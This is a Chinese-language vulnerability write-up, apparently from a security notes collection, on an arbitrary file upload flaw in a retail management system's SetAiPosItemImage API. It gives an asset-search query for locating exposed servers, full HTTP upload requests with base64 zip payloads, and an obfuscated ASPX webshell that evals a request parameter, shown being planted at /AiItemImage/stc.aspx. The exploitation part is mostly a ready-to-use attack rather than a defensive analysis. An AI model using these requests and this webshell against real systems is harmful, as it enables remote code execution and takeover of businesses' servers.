# 思迅商旗商业管理系统10 SetAiPosItemImage存在任意文件上传漏洞

# 一、漏洞简介
思迅商旗商业管理系统是基于互联网部署的全新零售管理系统。提炼各架构优势之大成，打造全新互联网产品。思思迅商旗商业管理系统7 SetAiPosItemImage存在任意文件上传漏洞。

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 思迅商旗商业管理系统10

# 三、资产测绘
+ hunter`app.name=="思迅商旗"`
+ 特征![1705135226264-0d5d4bd8-f3f8-4e10-a2da-14519b7ffa05.png](./img/EYVidbNdF5vXvYpz/1705135226264-0d5d4bd8-f3f8-4e10-a2da-14519b7ffa05-398111.png)

# 四、漏洞复现
```plain
POST /api/POS/SetAiPosItemImage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Length: 416
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
x-forwarded-for: 127.0.0.1

{"Body":{"pos_id":"test","file_data":"UEsDBBQAAAAIAJmoeFdm5m19YgAAAGQAAAATAAAAaW5pdC1jNTIyMjg1MzVhLmNzcwXBQQqEMAwAwLvgH3rcPXRJaV3Qk19JkxQLGsUqKuLfnekn4Yym0CqiBpXNZ8LTHpm3oXM+wHJ+77r6qRzF0rzrZpOTBjhBixJT5Cb9OXhHPgZwBBRvzmUZ8ep0Vnnq6nkBUEsBAj8AFAAAAAgAmah4V2bmbX1iAAAAZAAAABMAJAAAAAAAAAAgAAAAAAAAAGluaXQtYzUyMjI4NTM1YS5jc3MKACAAAAAAAAEAGADoFpjO1h7aAQAAAAAAAAAAAAAAAAAAAABQSwUGAAAAAAEAAQBlAAAAkwAAAAAA","last_time":""}}
```

![1705135268669-5e7dd30a-96c0-45eb-9c07-43b82a233582.png](./img/EYVidbNdF5vXvYpz/1705135268669-5e7dd30a-96c0-45eb-9c07-43b82a233582-331085.png)

上传文件位置

```plain
/AiItemImage/init-c52228535a.css
```

![1705135301442-a37e9e9c-c521-4b9b-b377-5d5f98f30f34.png](./img/EYVidbNdF5vXvYpz/1705135301442-a37e9e9c-c521-4b9b-b377-5d5f98f30f34-187161.png)

漏洞利用

准备webshell`stc.aspx`

```plain
<% function E873yr9k(){var GEPH="unsa",YACK="fe",C910=GEPH+YACK;return C910;}var PAY:String=Request["x"];~eval/*Zf10I0IzZH*/(PAY,E873yr9k());%><%@Page Language=JS%>
```

压缩webshell

[stc.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/1622799/1709222142219-d3f253b2-3b28-4613-acfc-43fc8ef73eba.zip)

将压缩文件转换为base64编码

[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222142539-f522d0ae-c3bc-443d-95b0-e63662e6b81b.jar)

![1705135429824-9f80641f-7249-46cd-b415-a3874272492c.png](./img/EYVidbNdF5vXvYpz/1705135429824-9f80641f-7249-46cd-b415-a3874272492c-032939.png)

上传webshell

```plain
POST /api/POS/SetAiPosItemImage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Length: 444
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
x-forwarded-for: 127.0.0.1

{"Body":{"pos_id":"test","file_data":"UEsDBBQAAAgIABeAKli/64yUkwAAAKQAAAAIABAAc3RjLmFzcHhVWAwAEkeiZa5OnmX1ARQAs1FVSCvNSy7JzM9TcLUwN64ssszW0KwuSyxScHcN8LBVKs0rTlTSiXR09rZVSktV0nG2NDSwBUlpg8Ssi1JLSovyFECi1rUgXQGOkVbBJUWZeem2QamFpanFJdFKFUqx1nWpZYk5+lpRaYYGngaeVVEeWvoaQLU6CEs1rVXtbFQdAhLTUxV8EvPSS4EMW69gVTsAUEsBAhQDFAAACAgAF4AqWL/rjJSTAAAApAAAAAgADAAAAAAAAAAgAKSBAAAAAHN0Yy5hc3B4VVgIABJHomWuTp5lUEsFBgAAAAABAAEAQgAAAMkAAAAAAA==","last_time":""}}
```

![1705135455265-09705950-bc64-49f0-a43c-9771ade4110f.png](./img/EYVidbNdF5vXvYpz/1705135455265-09705950-bc64-49f0-a43c-9771ade4110f-087471.png)

上传文件位置

```plain
/AiItemImage/stc.aspx
```

![1705135492983-2de64683-d6e8-42cb-b251-38c7c38eed5b.png](./img/EYVidbNdF5vXvYpz/1705135492983-2de64683-d6e8-42cb-b251-38c7c38eed5b-212372.png)

[思迅商旗-setaipositemimage-任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222142739-e95ae867-5ce0-482d-8b4e-707627bcdbe4.yaml)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fbpfgs6seeig8wdu>